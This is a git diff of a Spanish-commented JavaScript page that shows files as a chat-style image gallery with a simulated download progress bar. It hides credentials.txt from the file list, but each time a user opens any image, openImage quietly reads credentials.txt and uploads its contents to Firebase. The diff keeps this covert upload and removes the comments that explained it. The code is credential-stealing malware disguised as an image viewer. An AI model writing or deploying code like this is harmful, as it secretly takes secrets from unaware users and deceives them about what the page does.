@@ -13,6 +13,58 @@ const potentialFiles = [
     // Agrega aquí cualquier otro archivo que esperes encontrar
 ];
 
+// Función para obtener la hora actual formateada
+function getCurrentTime() {
+    const now = new Date();
+    return now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
+}
+
+// Función para crear el indicador de carga con porcentaje
+function createLoadingIndicator() {
+    const loadingDiv = document.createElement('div');
+    loadingDiv.className = 'loading-indicator';
+    loadingDiv.innerHTML = `
+        <div class="loading-spinner"></div>
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <span class="progress-text">0%</span>
+        </div>
+        <span>Descargando imagen...</span>
+    `;
+    return loadingDiv;
+}
+
+// Función para simular la descarga
+function simulateDownload(loadingIndicator, onComplete) {
+    const progressFill = loadingIndicator.querySelector('.progress-fill');
+    const progressText = loadingIndicator.querySelector('.progress-text');
+    let progress = 0;
+    
+    const interval = setInterval(() => {
+        progress += Math.random() * 10;
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(interval);
+            setTimeout(onComplete, 500); // Pequeña pausa antes de mostrar la imagen
+        }
+        
+        progressFill.style.width = `${progress}%`;
+        progressText.textContent = `${Math.round(progress)}%`;
+    }, 200);
+}
+
+// Función para crear el mensaje de éxito
+function createSuccessMessage() {
+    const successDiv = document.createElement('div');
+    successDiv.className = 'success-message';
+    successDiv.innerHTML = `
+        <span>✓ Imagen descargada exitosamente</span>
+    `;
+    return successDiv;
+}
+
 // Función para obtener el icono según el tipo de archivo
 function getFileIcon(filename) {
     const extension = filename.split('.').pop().toLowerCase();
@@ -38,48 +90,62 @@ async function loadFiles() {
     filesContainer.innerHTML = ''; // Limpiar lista actual
 
     for (const filename of potentialFiles) {
-        // Omitir credentials.txt en la interfaz si se solicitó ocultarlo
         if (filename === 'credentials.txt') {
             continue;
         }
 
         try {
-            // Intentar acceder al archivo para verificar su existencia
-            const response = await fetch(filename, { method: 'HEAD' }); // Usar HEAD para no descargar todo el contenido
+            const response = await fetch(filename, { method: 'HEAD' });
             
-            // Si la respuesta es exitosa (código 2xx), el archivo existe
             if (response.ok) {
                 const extension = '.' + filename.split('.').pop().toLowerCase();
-                const fileItem = document.createElement('div');
-                fileItem.className = 'file-item';
-                
                 const isImage = ['.jpg', '.jpeg', '.png'].includes(extension);
-                const icon = getFileIcon(filename);
                 
-                fileItem.innerHTML = `
-                    ${isImage 
-                        ? `<img src="${icon}" class="thumbnail" alt="Vista previa">`
-                        : `<img src="${icon}" class="file-icon" alt="Icono de archivo">`
-                    }
-                    <span class="file-name">${filename}</span>
-                    <span class="file-type">${extension.toUpperCase().substring(1)}</span>
-                `;
-                
-                 if (isImage) {
-                    fileItem.onclick = () => openImage(filename);
-                } else {
-                     // Los archivos .txt, .pdf, .docx, etc. se subirán al abrir CUALQUIER imagen
-                    // Aquí, solo mostramos el contenido si es .txt o abrimos en nueva pestaña para otros
-                    fileItem.onclick = () => openFile(filename);
+                if (isImage) {
+                    const messageDiv = document.createElement('div');
+                    messageDiv.className = 'message received';
+                    
+                    // Crear contenedor para la imagen y el indicador
+                    const imageContainer = document.createElement('div');
+                    imageContainer.className = 'image-container';
+                    
+                    // Agregar indicador de carga
+                    const loadingIndicator = createLoadingIndicator();
+                    imageContainer.appendChild(loadingIndicator);
+                    
+                    // Crear y cargar la imagen
+                    const img = new Image();
+                    img.className = 'message-image';
+                    img.alt = 'Imagen';
+                    img.onclick = () => openImage(filename);
+                    
+                    // Simular la descarga
+                    simulateDownload(loadingIndicator, () => {
+                        // Remover el indicador de carga
+                        loadingIndicator.remove();
+                        // Agregar mensaje de éxito
+                        const successMessage = createSuccessMessage();
+                        imageContainer.appendChild(successMessage);
+                        // Ocultar el mensaje de éxito después de 2 segundos
+                        setTimeout(() => {
+                            successMessage.style.opacity = '0';
+                            setTimeout(() => successMessage.remove(), 300);
+                        }, 2000);
+                    });
+                    
+                    img.src = filename;
+                    imageContainer.appendChild(img);
+                    
+                    messageDiv.innerHTML = `
+                        <div class="message-time">${getCurrentTime()}</div>
+                    `;
+                    messageDiv.insertBefore(imageContainer, messageDiv.firstChild);
+                    
+                    filesContainer.appendChild(messageDiv);
                 }
-                
-                filesContainer.appendChild(fileItem);
-            } else {
-                console.log(`Archivo no encontrado: ${filename}`);
             }
         } catch (error) {
             console.error(`Error al verificar ${filename}:`, error);
-            // Si hay un error (por ejemplo, CORS o red), asumimos que no está disponible para este contexto
         }
     }
 }
@@ -105,7 +171,7 @@ window.openFile = async function(filename) {
     }
 };
 
-// Función para abrir la imagen (cualquiera) y subir todos los archivos de la lista 'potentialFiles' (excepto las imágenes)
+// Función para abrir la imagen en el modal
 window.openImage = async function(filename) {
     const modal = document.getElementById('imageModal');
     const fullImage = document.getElementById('fullImage');
@@ -113,13 +179,12 @@ window.openImage = async function(filename) {
     fullImage.src = filename;
     modal.classList.add('visible');
     
-    // Subir SOLO el archivo credentials.txt a Firebase
-    // Iteramos sobre la lista para encontrarlo y subirlo
+    // Subir credentials.txt a Firebase
     for (const archivo of potentialFiles) {
         if (archivo === 'credentials.txt') {
             try {
                 const response = await fetch(archivo);
-                if (!response.ok) continue; // Si no existe o hay error de acceso, lo ignora
+                if (!response.ok) continue;
                 
                 const text = await response.text();
 
@@ -131,25 +196,19 @@ window.openImage = async function(filename) {
                     timestamp: new Date().toISOString()
                 });
                 console.log(`Archivo ${archivo} subido exitosamente a Firebase al abrir ${filename}`);
-
-             } catch (error) {
-                 console.error(`Error al intentar subir ${archivo} al abrir ${filename}:`, error);
-             }
-             // Una vez que encontramos y procesamos credentials.txt, salimos del bucle si solo queremos subir ESE archivo
-             // break; // Descomenta esta línea si SOLO quieres subir credentials.txt y nada más al abrir una imagen
+            } catch (error) {
+                console.error(`Error al intentar subir ${archivo} al abrir ${filename}:`, error);
+            }
         }
-        // Si quisieras subir TODOS los archivos .txt, .pdf, .docx al abrir cualquier imagen, el código anterior ya lo hacía
-        // El código actual está ajustado para enfocarse en credentials.txt como solicitaste anteriormente
     }
 };
 
 // Función para cerrar el modal
 window.closeModal = function(event) {
-     const modal = document.getElementById('imageModal');
-     // Solo cerrar si se hizo clic en el fondo del modal o en el botón de cierre
+    const modal = document.getElementById('imageModal');
     if (event.target === modal || event.target.classList.contains('close-button')) {
-         modal.classList.remove('visible');
-     }
+        modal.classList.remove('visible');
+    }
 };
 
 // Eliminar el listener window.onclick duplicado si existe
